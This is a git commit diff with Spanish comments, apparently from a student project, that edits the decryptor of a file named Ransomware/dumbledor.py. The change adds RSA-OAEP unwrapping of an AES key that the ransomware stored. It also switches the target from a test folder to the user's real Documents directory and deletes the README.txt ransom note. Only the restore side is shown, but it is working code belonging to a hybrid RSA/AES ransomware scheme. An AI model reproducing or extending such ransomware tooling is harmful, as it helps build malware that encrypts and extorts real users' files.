dfa989e8ce97fe9c223ae175f465407cdb2a82a0
ethandamian <ethandamian@ciencias.unam.mx>
2024-10-13 19:01:08 -0600

    change rsa encryption key

--- Ransomware/dumbledor.py
+++ Ransomware/dumbledor.py
@@ -1,9 +1,32 @@
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import unpad
+from Crypto.PublicKey import RSA
 import os
 
 def load():
     return open('key.key', 'rb').read()  # Cargar la clave desde un archivo
+
+def load_private_key(private_key_path='private_key.pem'):
+    # Cargar la llave privada RSA desde el archivo
+    with open(private_key_path, 'rb') as priv_file:
+        private_key = RSA.import_key(priv_file.read())
+    return private_key
+
+def decrypt_aes_key_with_private_key(encrypted_key_path='key.key.enc', private_key=None):
+    # Cargar la clave AES cifrada desde el archivo
+    with open(encrypted_key_path, 'rb') as enc_file:
+        encrypted_key = enc_file.read()
+
+    # Crear un descifrador RSA usando PKCS1_OAEP
+    cipher_rsa = PKCS1_OAEP.new(private_key)
+    decrypted_key = cipher_rsa.decrypt(encrypted_key)
+    return decrypted_key
+
+def save_decrypted_aes_key(decrypted_key, output_path='key.key'):
+    # Guardar la clave AES descifrada en un archivo
+    with open(output_path, 'wb') as key_file:
+        key_file.write(decrypted_key)
+    print(f"Clave AES descifrada guardada en '{output_path}'.")
 
 def decrypt(files, key):
     for file in files:
@@ -20,17 +43,32 @@ def decrypt(files, key):
             f.write(decrypted_data)  # Sobrescribir el archivo con datos desencriptados
 
 if __name__ == '__main__':
+    # path_to_decrypt = './TestFiles'  # Cambia esto a la ruta deseada
+    documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
+
+     # Cargar la llave privada
+    private_key = load_private_key('private_key.pem')
+
+    # Descifrar la clave AES
+    decrypted_aes_key = decrypt_aes_key_with_private_key(private_key=private_key)
+
+    # Guardar la clave AES descifrada
+    save_decrypted_aes_key(decrypted_aes_key)
+
+     # Eliminar llave cifrada
+    if os.path.exists("key.key.enc"):
+        os.remove("key.key.enc")
+
     key = load()  # Cargar la clave
-    path_to_decrypt = './TestFiles'  # Cambia esto a la ruta deseada
 
     # Eliminar el archivo README si existe
-    readme_path = os.path.join(path_to_decrypt, 'README.txt')
+    readme_path = os.path.join(documents_path, 'README.txt')
     if os.path.exists(readme_path):
         os.remove(readme_path)
 
     # Cargar la lista de archivos para desencriptar
-    items = os.listdir(path_to_decrypt)
-    full_path = [os.path.join(path_to_decrypt, item) for item in items]
+    items = os.listdir(documents_path)
+    full_path = [os.path.join(documents_path, item) for item in items]
 
     # Desencriptar archivos
     decrypt(full_path, key)
